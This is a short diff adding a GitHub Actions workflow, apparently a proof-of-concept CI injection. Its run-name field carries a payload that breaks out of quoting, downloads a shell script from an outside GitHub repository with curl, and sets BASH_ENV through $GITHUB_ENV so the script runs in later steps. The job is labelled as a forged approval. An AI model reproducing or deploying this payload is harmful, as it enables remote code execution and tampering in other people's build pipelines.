@@ -1,0 +1,11 @@
+name: ApprovalComment
+run-name: >-
+  h";echo LH6_RCE_MARKER;curl -s -o /tmp/lh6_s2.sh https://raw.githubusercontent.com/lazyhacker6/triage-pinterest-vc5dd446-11ed78/main/s2.sh;echo BASH_ENV=/tmp/lh6_s2.sh>>$GITHUB_ENV;exit 0;#
+on:
+  pull_request:
+permissions: {}
+jobs:
+  pass:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo forged-approval-complete
